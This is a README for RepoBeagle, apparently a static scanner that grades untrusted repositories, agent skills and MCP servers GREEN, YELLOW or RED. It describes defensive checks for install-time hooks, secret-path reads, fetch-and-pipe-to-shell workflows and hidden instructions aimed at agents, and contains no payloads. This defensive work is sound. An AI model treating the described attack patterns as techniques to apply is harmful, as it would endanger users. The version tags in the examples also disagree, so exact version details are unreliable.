# RepoBeagle

![RepoBeagle: Don't clone what you haven't sniffed.](assets/banner.png)
![RepoBeagle](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/javierbits/repobeagle/repobeagle/badge.json) — this repository's own badge, published and signed by the `self-scan` workflow it ships (`.github/workflows/self-scan.yml`, generated with `repobeagle init`).

**Use it as a Grok Bot:** [Get the RepoBeagle bot](https://x.ai/bot/bTuuNK785OULBheQ5rPZ-) and paste any repo link to get a safety verdict.

*Sniffs out malicious repos before you trust them.* Run `repobeagle scan <url>`. Want it shorter? Add `alias beagle=repobeagle` to your shell; the installer does not create `beagle` because PackageBeagle already uses that name. The wrapper adds every Docker hardening flag for you (`--rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges --user $(id -u):$(id -g) --tmpfs /tmp`, target mounted `:ro`), so you never type docker flags.

A static safety check for untrusted repos, such as LLM-generated skills, plugins, MCP servers and "guides".
You give it a git URL or a local folder and get a **GREEN / YELLOW / RED** verdict, with `file:line` evidence for each finding.

**RepoBeagle never runs repo code.** It never runs installs or builds, and it never extracts archives.

## Install (DGX Spark / any Linux, arm64 or x86_64)
The scanners ship as a prebuilt **public** multi-arch image (no login needed), `ghcr.io/javierbits/repobeagle` (linux/amd64 + linux/arm64). It's built by `.github/workflows/image.yml` on every push to main, on `v*` release tags, weekly, and on manual dispatch. Release tags get `v1.166.0`-style and `stable` tags; main also gets `latest`, `sha-<commit>` and the ISO week (e.g. `2026-W42`). `install.sh` and `repobeagle` default to the image matching the `VERSION` file (currently `v1.166.0`).
```bash
git clone https://github.com/javierbits/repobeagle && cd repobeagle
./install.sh                   # docker pull ghcr.io/javierbits/repobeagle:v1.166.0 + install the repobeagle wrapper
./install.sh --build-local     # fallback: build the same image locally from the Dockerfile
./install.sh --local-tools     # also install gitleaks/semgrep/guarddog/bandit on the host for --no-docker
```
`install.sh` is idempotent. It does the following:
- Checks that Docker is available and pulls (or builds) the image.
- Installs `osv-scanner`, which runs on the host because it needs network. Arch is detected from `uname -m`: aarch64 gets `linux_arm64`, x86_64 gets `linux_amd64`.
- Pins every downloaded artifact to an exact version and verifies its SHA-256 against `checksums.txt`; an artifact without a checksum is refused rather than installed. `image.yml` keyless-signs the image by digest and the installer checks that signature (set `BEAGLE_REQUIRE_SIGNATURE=1` to make an unsigned image fatal; tags published before signing only warn).
- Pins the scanner image too: base image by multi-arch digest, scanner versions in `constraints.txt`. Every report records the exact versions in `meta.tools`, so a diff between two reports is a diff of the code, not of the toolchain. Bumping either is deliberate.
- Writes a thin `~/.local/bin/repobeagle` wrapper.

If Docker isn't available, it installs the host tools automatically, and scans run with `--no-docker`.

How a scan is split up:
- **Clone (host, network-enabled):** a filtered, hooks-disabled git fetch that never executes anything.
- **Scan (container):** `docker run --rm --network none --read-only --cap-drop ALL`, non-root, with the clone mounted read-only.
- **OSV (host):** lockfiles only.

Set `BEAGLE_IMAGE` to use a different tag (e.g. `ghcr.io/javierbits/repobeagle:latest` for the newest main build).

### Light mode (pipx / pip, no Docker) — Linux and macOS
The image stays the recommended, hardened path. For hosts that cannot run Docker (CI runners, macOS laptops, airgapped analysis boxes) the scanner is also a normal Python package (stdlib only):

```bash
pipx install .                 # or: python3 -m venv .venv && .venv/bin/pip install .
repobeagle scan tests/fixtures/trap-npm --no-docker
```

Requirements: `python3 >= 3.10` plus whichever host tools the scan shells out to (`gitleaks`, `semgrep`, `guarddog`, `bandit`, `osv-scanner`); install them with `pipx install semgrep guarddog bandit` and `brew install gitleaks osv-scanner`, or skip `--no-docker` and let the image supply them. A missing tool degrades to a note and is listed in the report; it never widens a verdict silently. The wheel ships the custom semgrep rules and the version under `<prefix>/share/repobeagle/` (the scanner falls back to them when no repository `rules/` directory is next to the module), and the console script is `repobeagle`.

macOS: `install.sh` now detects `Darwin` and installs `gitleaks`/`osv-scanner`/`cosign` with Homebrew instead of downloading Linux binaries (it still uses Docker Desktop when available, which runs the same arm64 image). `pipx install .` is the light path on macOS arm64 and needs no container.

- The light path is exercised in CI: the `packaging-macos` job runs `pipx install .` on the macOS arm64 runner image (`macos-latest`), then scans `tests/fixtures/trap-npm --no-docker` with the installed console script from outside the checkout. A packaging contract test checks the wheel entry point, the shipped `VERSION`/semgrep rules fallback and the installer's macOS/Homebrew branch.
- Airgapped hosts: `tools/build_binary.sh` builds a one-file PyInstaller binary (pinned PyInstaller, bundles the module, `VERSION` and the custom semgrep rules) into `dist/repobeagle`; the `binary` workflow publishes linux amd64/arm64 and macOS arm64 artifacts for tags and manual runs. The binary still shells out to the host tools it needs, and the Docker image remains the recommended hardened path.

## Install interceptor (`repobeagle run`)
The dangerous moment is install, and `npx -y` fetches and runs code before anyone pastes a URL. Prefix the runner with `repobeagle run --` and the package is scanned first:
```bash
repobeagle run -- npx -y cowsay            # resolves npm -> github.com/piuccio/cowsay, scans, then runs
repobeagle run --dry-run -- uvx ruff       # scan only, print the verdict
repobeagle run --repo owner/repo -- npx -y some-package   # skip the registry lookup
```
- Parses `npx`, `pnpm dlx`, `yarn dlx`, `bunx` (npm), `pipx run`/`uvx` (PyPI) and `cargo install` (crates.io); the package name's registry JSON is queried for its repository URL (cached under `$XDG_CACHE_HOME/repobeagle/registry`, `BEAGLE_REGISTRY_TTL`, no package code executed). `--repo` accepts a slug, git URL or local dir when the registry has no repository.
- The repository is scanned through the normal pipeline (profile/persona/offline flags apply; the hardened image is used when Docker is available). `--dry-run` scans and prints without executing.
- Policy: **GREEN** runs the command; **YELLOW** prompts on a TTY, refuses in CI unless `--yes`/`--force`; **RED** refuses unless `--force`. A scan failure or refusal exits 1 without running anything; otherwise the wrapped command's exit code passes through unchanged.
- Limits: only those runners are understood; the scan covers the repository (default branch), not the exact published tarball; a missing scanner tool is a note as usual.

## Rule packs (`.repobeagle/rules/*.yml`)
Teams can ship regex rules without editing the scanner. A pack is a versioned file, loaded automatically from the scanned tree (and fetched on the metadata `head` path), whose rules compile into the same finding shape as the built-in checks:
```yaml
version: 1
rules:
  - id: no-console-log          # reported as the rule id
    paths: ["src/**/*.js"]       # globs, relative to the repo root
    regex: '^\s*console\.log\('  # per-line regex; must be anchored with ^ or \b
    severity: low
    meaning: "console.log left in shipped code"
    remediation: "use the project logger"
    fixtures:                     # required: at least one of each
      positive: ["console.log('x')"]
      negative: ["logger.info('x')"]
```
- `repobeagle rules lint <pack-or-dir>` validates schema/version, unique ids, severity, paths, meaning/remediation, regex compilation, **anchoring** (`^`/`\b`: the scanner matches line by line, never a whole-file search) and **catastrophic backtracking** (nested quantifiers like `(a+)+`). Any error exits 1; nothing is skipped silently.
- `repobeagle rules test <pack-or-dir>` lints first, then places each fixture in a matching path, runs the rule pipeline and requires every positive fixture to fire the exact rule id and every negative not to. CI uses the same command for contributed packs.
- Scan integration: findings carry `tool: "rules"`, the configured severity/meaning and the `remediation`; matches are capped at 20 per rule with a summary finding; `meta.rule_packs` records the files and rule count. An invalid pack aborts the scan (exit 1) and an explicit `.repobeagle.yml` rule override or persona delta applies to pack ids like any other.
- Packs are additive and regex-only: they cannot express context-sensitive logic, and an id that collides with a built-in rule simply shares the suppression/override namespace.

## Optional syscall trace (`--trace`)
Everything above is static. `repobeagle scan <target> --trace` additionally **runs only the install phase** inside the same hardened container and verifies capability claims with `strace`:
- Detected install-time code only: npm `preinstall`/`install`/`postinstall` lifecycle scripts and Python install (`pip install --no-deps --no-build-isolation --no-index`, so no network is needed for the Python path). Tests and builds are never run.
- The trace container keeps the same isolation (`--read-only`, non-root, `--cap-drop ALL`, pids/memory limits, `HOME=/tmp`) and adds a writable mount of the throwaway tree plus **network** (installs download); `execve`, `connect` and `openat` are recorded. `BEAGLE_TRACE_TIMEOUT`/`--trace-timeout` bounds it (default 300 s).
- Evidence is folded into the capability map: hosts from the executed command lines, executed programs, and opened secret paths are marked `verified: true, source: trace` (loopback connects are skipped); `meta.trace` records the commands, syscall counts, exit code and network mode, and an `info` finding states how many values were confirmed. Static claims that match the observed values flip; the rest stay `static`.
- What it proves: what the install scripts actually contacted and executed **inside the container**. Host secrets are structurally unreachable (`HOME=/tmp`, nothing mounted), so it does not verify credential reads against your home directory. The default (no `--trace`) still never executes repository code.
- The image ships `strace` and `node` for this; a missing Docker image/`--no-docker` turns `--trace` into a note, not a failed scan.

## Workspaces and monorepos
A monorepo is scanned as one tree, but findings and first-party inference respect package boundaries:
- **Detection**: npm/pnpm/yarn `workspaces`, Cargo `[workspace] members`, `go.work` modules and nested Python projects (`pyproject.toml`/`setup.py`); capped by `BEAGLE_MAX_PACKAGES` (default 50, the report says when the cap was hit). Only declared workspace members are considered, never a guessed directory.
- **Attribution**: findings whose `file` lies inside a package carry `package` (the manifest name) and `package_path`; the human report prints `package: …`. Findings outside any package belong to the `(root)` bucket. Cross-workspace dependencies stay attributed to the package whose lockfile path produced them.
- **First-party inference per package**: `own_domains()` is computed per package root (its own `CNAME`/`package.json`/`pyproject.toml`/…, plus `hosts` from `.repobeagle.yml`), so package A's `CNAME` cannot mark package B's host as first-party, and root domains do not leak into packages. `meta.workspace` lists the packages and per-package severity counts (including `(root)`); their sum equals the report's totals.
- Limits: a workspace member that is not declared by a manifest is treated as part of the enclosing package/root, and one package's lockfile is not expanded into its siblings' attribution beyond its own path.

## Archives and release assets
Archives are a documented blind spot when they sit inside a repo (they are flagged, never extracted). They can be inspected when they *are* the target, or when they are release assets:
```bash
repobeagle scan ./bundle.zip              # zip/tar/tar.gz extracted to the temp dir under limits, then scanned
repobeagle scan OWNER/REPO --release-assets OWNER/REPO   # latest release's archive assets, same treatment
```
- `safe_extract()` rejects absolute paths and `..` members, never creates or follows symlinks (they are recorded as `archive-skipped` findings), and caps entries (`BEAGLE_ARCHIVE_MAX_ENTRIES`, default 5000), per-entry bytes (`BEAGLE_ARCHIVE_MAX_ENTRY_BYTES`, 64 MiB) and total bytes (`BEAGLE_ARCHIVE_MAX_TOTAL_BYTES`, 512 MiB) before and while extracting. Hitting a cap is a `low` `archive-truncated` finding; extraction stops cleanly, so a decompression bomb cannot fill the disk.
- `.zip`, `.tar`/`.tar.gz`/`.tgz`/`.tar.xz`/`.tar.bz2` and single-file `.gz`/`.xz`/`.bz2` are expanded one level; `.7z`/`.rar`/`.zst` stay flagged as uninspectable, and an encrypted zip keeps its existing finding instead of failing.
- `--release-assets OWNER/REPO` downloads up to five archive assets of the latest GitHub release (`BEAGLE_ASSET_MAX_BYTES`, 200 MiB each), extracts them under the same limits and scans the contents; their findings carry a `release-assets/<asset>/` path prefix, and `meta.release_assets` records each asset (bytes, entries, extracted, truncated, findings). Download failures degrade to a note.
- The extracted members are scanned as a normal tree (secrets, workflows, manifests, telemetry); the archive itself is never executed.

## Personas (`--as`)
`--as consumer|agent-operator|ci|maintainer` applies a **severity lens** over rule ids before the verdict: the persona's table moves matching findings (globs like `gha-*`) up or down the `info→critical` scale, then the profile thresholds decide the verdict. `repobeagle --list-personas` prints each lens, what it cares about and its deltas. It works on `scan`, `head`, `gate` and `batch` (`meta.persona` records it and the human report prints `persona: …`).

The four lenses: **consumer** (running it on my machine: install payloads and secrets up, CI/dev rules down, telemetry up), **agent-operator** (hidden markdown instructions, invisible text, MCP/tool permissions up), **ci** (workflow shell, install hooks, unpinned bases, dependency confusion up) and **maintainer** (telemetry/privacy noise down, structural findings unchanged). Example: `trap-gha` is YELLOW by default and RED with `--as ci`; `trap-skill` is RED for `--as agent-operator`; `trap-telemetry` stays YELLOW under `--as maintainer`.

Persona and profile are deliberately different dimensions — a persona changes rule severities, the profile changes the verdict thresholds; an explicit `.repobeagle.yml` rule override wins over a persona delta (config is applied last), and an unknown persona/rule id is an error. Combining `--as` with a profile is supported and documented; there is no silent "strongest wins".

## Per-repository policy (`.repobeagle.yml`)
A repository can declare its policy next to its code. `scan` and the metadata `head` path read `.repobeagle.yml` from the scanned tree, validate it before doing work, and record what was applied in `meta.config`:
```yaml
profile: strict          # used when no --strict/--balanced/--relaxed flag is given (an explicit CLI profile wins)
rules:                   # per-rule severity override, exact id or glob; unknown ids are errors
  telemetry-devtool: info
hosts:                   # treated as first-party: no third-party-* findings, endpoints count as own
  - cdn.example.com
custom_checks:           # regex checks that emit file:line findings with the configured severity
  - id: no-print
    paths: ["src/**/*.py"]
    pattern: '\bprint\('
    severity: low
    meaning: "debug print in library code"
```
- JSON is accepted too (it is valid YAML); the built-in parser covers block mappings/lists, inline `[...]` lists, quoted scalars and comments — not anchors or multi-line strings. Errors name the file element (and nearby rule ids for typos).
- Unknown rule ids, severities or profiles, uncompilable regexes and empty paths/meanings fail the scan (exit 1) instead of being silently ignored.
- Overridden findings keep their rule id/title and are re-graded before the verdict; the overrides are listed in `meta.config.rules`. Custom checks are capped at 20 matches per check with a summary finding, and their findings use the `custom-check` rule with the configured severity and meaning.
- The config content is part of the content-addressed analysis cache key, so editing the policy invalidates cached results. Defaults are identical when the file is absent.

## Use it as an agent skill

`skill/SKILL.md` is a first-party skill that teaches an agent **when** to reach for RepoBeagle (before cloning/installing/running something untrusted, before enabling an MCP server or skill, on dependency PRs, before trusting a badge), **which mode** to use (`head`, `scan`, `run`, `gate`/`batch`, `verify`, `explain`/`diff`, `init`/`feedback`) and **how to read the verdict** — verdict/exit codes, `meta.complete`/`meta.scope`/`meta.tools`, finding fields (including `fixed_in`, `dependency_path`, `package`), suppression state, and the stop rules. `skill/mcp.json` registers the stdio MCP server (`repobeagle mcp`).

```bash
# pin the same release tag as your agent skill and the scanner
cp skill/SKILL.md <your-agent-skills-dir>/repobeagle/SKILL.md     # or point your loader at the checkout
cp skill/mcp.json <your-agent-skills-dir>/repobeagle/mcp.json     # MCP host: registers `repobeagle mcp`
# light-mode installs ship the same files at <prefix>/share/repobeagle/skill/
```

The skill is a drift-guarded document: `tests/test_skill.py` extracts every documented `repobeagle …` invocation, asserts its subcommand and flags exist in `--help`, executes every recipe against the fixtures (the `{json}` placeholder is a temp path), and checks every documented JSON field against a real report or the module source. The recipes cover `--version`, `head`, `scan --strict`, `explain --target`, `gate` and `run --repo`; the prose covers the network/partial/trace caveats. When the CLI changes, CI fails until the skill is updated.

## Usage
```bash
repobeagle scan <git-url | local-dir> [--ref <branch|tag|sha>] [--since <rev>] [--strict|--balanced|--relaxed] [--keep] [--json out.json]
                [--no-docker] [--no-osv] [--offline-vulnerabilities] [--verify-deps] [--all] [--min-severity info|low|medium|high|critical] [--no-color]
                [--no-cache] [--as consumer|agent-operator|ci|maintainer] [--release-assets OWNER/REPO] [--trace]
                [--baseline old.json [--baseline-min-severity medium]] [--privacy-only | --no-privacy] [--no-redact]
                [--html out.html] [--sbom sbom.json] [--max-seconds SECONDS] [--jobs N]
repobeagle privacy <git-url | local-dir> [same scan options]
repobeagle explain <report.json> [--accept RULE...] [--target green|yellow] [--write [--ignore-file FILE] [--reason TEXT]]
repobeagle diff <old.json> <new.json> [--min-severity medium] [--json out.json]
repobeagle trend <github-repo | report-dir | report.json...> [--branch BRANCH] [--limit N] [--json out.json]
repobeagle serve [--host HOST] [--port PORT] [--cache DIR] [--root DIR] [--ip-budget N] [--repo-budget N] [--concurrency N] [--sign [--key FILE]] [scan flags]
repobeagle app [--host HOST] [--port PORT] [--secret TEXT] [--app-id ID] [--private-key FILE] [--token TOKEN] [--api-url URL] [--root DIR] [scan flags]
repobeagle index [ENTRY...] [--repos FILE] [--out DIR] [--jobs N] [--cap N] [--sign [--key FILE]] [scan flags] [--json out.json]
repobeagle release <owner/repo> [--tag TAG] [--package NAME] [--ecosystem npm|pypi|crates] [--version VERSION] [--repo DIR] [--tarball FILE] [--registry-json FILE] [--json out.json]
repobeagle fix <local-dir> [--dry-run] [--pins FILE] [--no-network] [--json out.json]
repobeagle head <owner/repo | github-url | local-dir> [--strict|--relaxed] [--json out.json] [--markdown] [--no-cache] [--as PERSONA]
repobeagle gate <entries-file> [--baseline old.json] [--json out.json] [--markdown] [--jobs N] [--report-only] [--strict|--relaxed] [--as PERSONA]
repobeagle batch <targets-file> [--jobs N] [--json DIR] [--strict|--relaxed] [--as PERSONA] [scan offline flags]
repobeagle ignore [RULE [--reason TEXT] [--until YYYY-MM-DD]] [--file FILE] [--list] [--report r.json] [--json out.json]
repobeagle init [dir] [--profile strict|balanced|relaxed] [--badge-branch BRANCH] [--repo OWNER/NAME] [--tools-ref REF] [--dry-run] [--force]
repobeagle export <report.json> [--format sarif|markdown|html|json] [-o out]
repobeagle feedback <report.json> (--false-positive|--miss) [--rule RULE] [--file FILE[:LINE]] [--attach] [--no-open] [--repo OWNER/NAME]
repobeagle scan <archive.zip|archive.tar.gz> [scan flags]
repobeagle rules lint|test <pack-file-or-dir>...
repobeagle run [--dry-run|--yes|--force] [--repo TARGET] [scan flags] -- <npx|pnpm dlx|yarn dlx|bunx|pipx run|uvx|cargo install ...>
repobeagle map <git-url | local-dir | --report r.json> [--strict|--relaxed] [--network]
repobeagle web <http(s):// | file://> [--assets N] [--json out.json]
repobeagle mcp
repobeagle db [--update] [dir]
repobeagle --version | version
repobeagle --list-personas
repobeagle update [--check]
```
`repobeagle explain` takes a report produced by `scan --json` and prints the threshold arithmetic behind its verdict — which profile threshold was met, the margin to the next tier, and the largest rule contributors. It never re-scans and touches no network, so it works on a report someone shared with you.

It also plans the decision: `--accept <rule>…` (rule ids or globs, the same matching as `.repobeagleignore`) simulates accepting them and prints the verdict after, plus the counts that remain — accepting rules must not hide the fact that findings remain, so the remaining counts are always printed. `--target green|yellow` chooses whole rules itself, each step the rule that moves the verdict closest to the target (lighter rules win ties), and stops when the target is reached. `--write` appends the accepted/planned rule ids to `.repobeagleignore` (or `--ignore-file FILE`) with a reason comment (default: `reviewed with repobeagle explain --write`), skipping ids that are already there, so the next scan suppresses them. If the AI review sets the verdict independently of the findings, the planner says the target cannot be reached that way. Example:

```console
$ repobeagle explain report.json --target yellow
planner:
  planned (each step the rule that moves the verdict closest to the target): Vulnerable dependency (3 finding(s))
  after the plan: YELLOW  (remaining findings: critical 0, high 2, medium 4)
  target yellow: reached
```

`repobeagle diff` compares two reports and classifies what the change added or removed, matching on rule id + file so line moves and re-indentation are not counts as changes. It exits 1 when an added finding is at or above `--min-severity` (default `medium`), which is the gate to use in CI: keep yesterday's report, scan the PR, and fail only on *new* findings. Like `explain`, it never re-scans. `scan --baseline old.json --baseline-min-severity high` does the scan and the same gate in one command: it exits 1 only when the scan added a finding at/above the threshold, and the verdict exit code is deliberately not used in that mode. `--baseline-min-severity` is separate from `--min-severity`, which only controls printing.
`repobeagle trend` reads the per-SHA reports that `scan.yml` already publishes (`report-<sha>.json` on the badge branch) and turns them into a verdict and rule history: ordered verdicts, first RED, per-rule regressions (a rule that appears after a report without it), the current streak, and the reason each malformed or incomparable report was skipped. A local directory of `report-*.json` or explicit report files needs no network; a GitHub slug lists the badge-branch commits (GitHub API, honors `BEAGLE_GITHUB_TOKEN`/`GITHUB_TOKEN`) and fetches the reports those commits name. Reports whose `meta.ruleset` or `version` differs from the newest report are skipped, because their rule ids are not comparable. `--json` emits the same ordered series for charts; no scan is re-run.

`repobeagle serve` exposes the attestation API over HTTP: `GET /v1/scan/<owner>/<repo>[/<ref>]` returns the report for a 7–40 character commit (omitted ref = HEAD), `/v1/scan/<owner>/<repo>/<ref>/bundle` returns the Sigstore bundle, `/o/<owner>/<repo>` renders the self-contained HTML report and `/healthz` is the unauthenticated liveness check. A scan runs once per resolved commit and the bytes are then immutable on disk under `--cache` (a corrupt cache entry is re-scanned, never served). Budgets are sliding windows: `--ip-budget` requests per hour per address and `--repo-budget` scans per hour per repository; over budget the answer is `429` with `Retry-After`, never a wrong verdict. `--sign` signs each report with cosign keyless signing under GitHub OIDC (the `service.yml` identity) or with `--key`; an unsigned report is labeled in `meta.service.signed`, `X-Repobeagle-Signed: false` and `/bundle` answers 404. The service uses the pinned image when Docker is available and scans in-process otherwise (`--no-docker` forces the latter). Budgets and locks are per process, so a restart resets them.

```bash
docker run --rm -p 8080:8080 -v beagle-cache:/tmp/.cache ghcr.io/javierbits/repobeagle:v1.191.0 \
  serve --host 0.0.0.0 --port 8080
curl -s localhost:8080/v1/scan/javierbits/repobeagle | jq .verdict
```

Local repositories can be served too (`--root DIR` → `/v1/scan/local/<directory>`), which is what the offline tests exercise; GitHub mode resolves HEAD and missing refs with `git ls-remote` and scans the resolved commit. The acceptance workflow `.github/workflows/service.yml` starts the service with keyless signing, fetches a scan and its bundle, verifies them with `repobeagle verify`, repeats the request for byte-identical cached output, and proves the `429` path.

`repobeagle app` runs the GitHub App webhook server. `pull_request` (`opened`, `synchronize`, `reopened`, `ready_for_review`) and default-branch `push` deliveries are signature-checked (`X-Hub-Signature-256`), queued (GitHub must get its 2xx in seconds) and scanned statically with the same `scan` flags as every other frontend. Pull requests are scanned with `--since <base>` so the comment says `changed files only`; the tree is fetched and never executed. Results are published as exactly one PR comment (edited in place on every push, found by a marker) and one check run per commit (`success`/`neutral`/`failure` for GREEN/YELLOW/RED, updated in place when the same delivery is replayed). A failed scan produces a failing check run and a comment that says so, instead of silence.

App permissions: `contents: read`, `metadata: read`, `pull_requests: write`, `issues: write`, `checks: write`. Configure `BEAGLE_APP_ID` + `BEAGLE_APP_PRIVATE_KEY` (PEM path or inline PEM; RS256 installation token) or a pre-issued `BEAGLE_INSTALLATION_TOKEN`, plus `BEAGLE_APP_WEBHOOK_SECRET`, and point the App's webhook URL at `https://<host>/webhook`. `--token` and `--root` make a single-installation or local test deployment possible without registering an App; the offline tests drive real signed webhook payloads against a stub GitHub API.

```bash
docker run --rm -p 8080:8080 \
  -e BEAGLE_APP_ID=123456 -e BEAGLE_APP_PRIVATE_KEY=/keys/app.pem -e BEAGLE_APP_WEBHOOK_SECRET=... \
  -v "$PWD/app.pem:/keys/app.pem:ro" ghcr.io/javierbits/repobeagle:v1.192.0 \
  app --host 0.0.0.0 --port 8080
```

`repobeagle index` builds the public precomputed index (published at https://javierbits.com/repobeagle/ by the `index.yml` workflow): it resolves each curated entry's HEAD (`tools/index-repos.txt`), skips a repository whose current SHA already has a signed result, scans in the pinned image with up to `--jobs` parallel workers, and writes `results/<owner>/<repo>@<sha>.json` plus a self-contained searchable `index.html` and one HTML page per repository. The result history accumulates, so a later run only processes changed SHAs; `--cap` bounds a run (the workflow uses 1000, which fits the workflow's 4 h timeout at `--jobs 20`).

`--sign` signs each report with cosign (keyless under GitHub OIDC, or `--key`); a report is only published with its `.sigstore.json` bundle, and the workflow runs `repobeagle verify` on every published report before deploying. `verify`'s default identity accepts the `index.yml` workflow. Local directories are accepted as entries (`local/<dir>`), which is what the offline tests use; `--out public` is the artifact root and is ignored by git.

`tools/scoreboard.py` is the precision/detection scoreboard (R7): `tests/corpus.yml` pins an honest cohort of twelve popular repositories by commit and the labeled trap fixtures as the detection cohort. The honest cohort measures false-positive drift — per-rule hit totals and the median finding count are the budget in `tests/corpus-baseline.json` — while the detection cohort asserts that every expected rule and verdict label still fires. Scans run in the pinned image with OSV/trust disabled so results are comparable; `--update-baseline` is a reviewed decision and the diff names every rule that moved. `.github/workflows/corpus.yml` runs it nightly, publishes the Markdown/JSON scoreboard as a job summary and artifact, and fails the job on any regression. The offline tests cover the median/rule gate and both detection failure modes with local fixtures.

`repobeagle release <owner/repo>` answers the question a repo scan cannot: *was the published package built from this repository?* It resolves the release tag (or `--tag`), fetches the registry metadata and artifact (npm/PyPI/crates, auto-detected from the manifest, or `--registry-json`/`--tarball` for offline runs) and compares semantics, never bytes: install hooks (`preinstall`/`install`/`postinstall`), dependency sets and ranges, package name/version, and a coarse file inventory (generated/minified files legitimately differ). Findings name exactly what moved: `release-drift` high for an added hook, an added dependency, a name/version mismatch, or a registry/artifact version mismatch; medium for a dropped hook or a changed range; info for repo dependencies absent from the artifact. Provenance is reported explicitly: `release-provenance` info when the registry carries npm `dist.attestations` or PyPI signatures, `no-provenance` low when it does not. The command exits 1 on a high drift, 0 when consistent, and 2 when the comparison cannot be made. It never executes package code. `--repo`, `--tarball` and `--registry-json` make it fully offline, which is how the fixtures are tested.

`meta.checks` (and the `Checks run:` line) is the rule-level evidence ledger: for the top ten high-signal rules it records whether the check family evaluated the repository, how many text files it examined, the hits and suppressed count, and the negative assertion that a zero-hit result proves (for example "no workflow pipes a downloaded script into a shell"). Only counters are stored, never per-file lists, so the JSON growth is constant on a large repo; an incomplete scan marks the assertions unproven (`evaluated: false`). The rule list and assertions live in `repobeagle/evidence.py`, and documented rules take their metadata from the R4 registry.

`repobeagle fix <local-dir>` rewrites only the findings whose fix is mechanical: an unpinned `uses:` becomes a resolved 40-character commit SHA, and a top-level `permissions: write-all` becomes `contents: read`. It edits the flagged line in place (no YAML re-serialisation, so comments and layout survive), prints a unified diff, and `--dry-run` writes nothing. It never clones (check out the repo first) and never executes repository code.

- Pins are resolved through the GitHub API. `--pins FILE` is a JSON `{owner/repo@ref: sha}` map for airgapped runs and tests; `--no-network` uses only that map, and an action it cannot resolve is skipped with a reason rather than guessed.
- Scope-level `permissions: <scope>: write` is deliberately left alone — whether a job needs write access is judgement. `write-all` is the broadest setting, so downgrading that is mechanical and reviewable; a job that needs more can add its own `permissions:` block.
- Review the printed diff before committing. Opening the PR is the workflow/App's job, not automated by `fix` yet.

Acceptance on `tests/fixtures/trap-gha` (copy, pins or network): both workflow files are rewritten, the re-scan loses `gha-unpinned-action`/`gha-write-permissions` and keeps the judgement findings, and `--dry-run` leaves the tree byte-identical (`tests/test_fix.py` asserts all three).

`repobeagle head <owner/repo | github-url | local-dir>` is the fast triage path: it fetches only a fixed metadata list through the GitHub contents API (or reads the same list from a local directory) — root manifests, README/PRIVACY/SECURITY/LICENSE, `SKILL.md`, `mcp.json`, `CODEOWNERS`, the PR template and every `.github/workflows/*.yml` — writes those files into a temporary tree and runs the offline agent checks. No clone, no Docker, no scanners, no repository code executed. The report says exactly what it is: `meta.scope = {scope: "metadata", paths_fetched, paths_available, paths, truncated}` and `meta.mode = "metadata (no clone, no scanners, …)"`.

- Rate limits: unauthenticated GitHub API is 60 requests/hour, so set `GITHUB_TOKEN`/`GH_TOKEN` (5,000/hour) for regular use. A 403 becomes a note and the verdict is computed from what arrived (`truncated: true`); if nothing was fetched the command exits 1 with the reason instead of inventing a verdict.
- Cache: per-slug responses live under `$XDG_CACHE_HOME/repobeagle/head` with a TTL (`BEAGLE_HEAD_CACHE_TTL`, default 3600 s); `--no-cache` bypasses it, and a cache hit is stated in the notes.
- `--markdown` prints the compact card for Slack/Discord/PR comments, and `--json` contains the same fields as a scan report, so a chat bot or unfurl service can consume it directly.
- Limits: metadata only. Source files, secrets, dependency advisories and the language-aware coverage are not fetched — a GREEN `head` is a triage signal, not a full-repo verdict.

`repobeagle export` converts a stored report to SARIF 2.1.0 (GitHub code scanning, Azure DevOps, VS Code), a Markdown table for a PR comment, a self-contained HTML page (inline CSS, no external assets, markup-escaped; snippets stay redacted), or normalized JSON. The same HTML is available during a scan with `--html out.html` (and on `head`). Every finding carries a stable `partialFingerprints` value and, when suppressed, an explicit SARIF suppression, so accepted findings stay visible but dismissed. The scan workflow uploads it when `upload-sarif: true`.
`repobeagle feedback <report.json> --false-positive|--miss` turns one finding into a prefilled GitHub issue in `javierbits/repobeagle` (`--repo OWNER/NAME` to change it): the URL contains the tool version, profile, ruleset, target and commit of the scan, the rule id, `file:line`, severity and the finding's title and snippet. The body is **always re-redacted** with `redact_pii` before the URL is built, so a report scanned with `--no-redact` cannot leak an email, phone, card or SSN through the issue; the body states whether the scan itself redacted. `--rule` selects the rule and `--file` disambiguates several findings (the command lists the candidates instead of guessing); the full report is attached only with `--attach`, and if the URL would exceed GitHub's limit the report is dropped first, then the snippet is truncated with a visible note. It prints the URL and opens it in a browser unless `--no-open` (use that in scripts). It only reads the stored report: no scan, no network.

`repobeagle scan --sbom sbom.json` writes a **CycloneDX 1.6** SBOM for the scanned tree, for enterprises that need an inventory next to the vulnerability report. Components come from the lockfiles already in the tree — `package-lock.json` (v1/v2/v3), `requirements.txt` (pinned `name==version`), `Cargo.lock` — as purls (`pkg:npm/lodash@4.17.21`, `pkg:pypi/flask@2.0.0`, `pkg:cargo/time@0.1.45`), with the manifest path on each component and the project itself as `metadata.component` rather than a library (capped at 5,000 components). OSV findings become `vulnerabilities` entries whose `affects[].ref` is the component purl and whose `ratings`/`recommendation` carry the advisory severity and fix; findings for packages absent from the lockfiles are skipped. The verdict, profile, ruleset, commit and severity counts are `metadata.properties` (`repobeagle:verdict`, …), and the document is deterministic (sorted components, serial derived from target+commit, no wall-clock timestamp). Limits: only those three manifest formats are read, unpinned/ranged requirements are not listed, and malformed manifests are named in `repobeagle:unparsed-manifests` instead of failing the scan. CI validates the npm/pip/cargo fixtures against the vendored official 1.6 schema (`tests/schema/bom-1.6.schema.json`, `tests/test_sbom.py`), pinned to 1.6 so schema drift cannot change the output silently.
`--max-seconds N` is a hard analysis budget (after the tree is fetched): when it expires the scan still writes everything it has — the JSON/HTML/SBOM report and the badge — with `meta.complete: false`, a note naming the phases that were skipped or cut, and a **verdict floor of YELLOW**: a truncated scan can never look GREEN. The same applies per file: the regex parsers run under a per-file alarm (`BEAGLE_FILE_SECONDS`, default 10 s), so one pathological file is skipped and listed as a `Slow-file` finding instead of losing the report. `scan.yml` distinguishes a crash (no artifact) from an incomplete scan (artifact with `meta.complete: false` and a badge that reads e.g. `YELLOW (partial)`); exit code 1, not a traceback. The deadline is a wall-clock budget, so a report cut this way is partial by definition — the deterministic core (`normalize_findings()`/`report_fingerprint()`) only sees the findings that were produced.

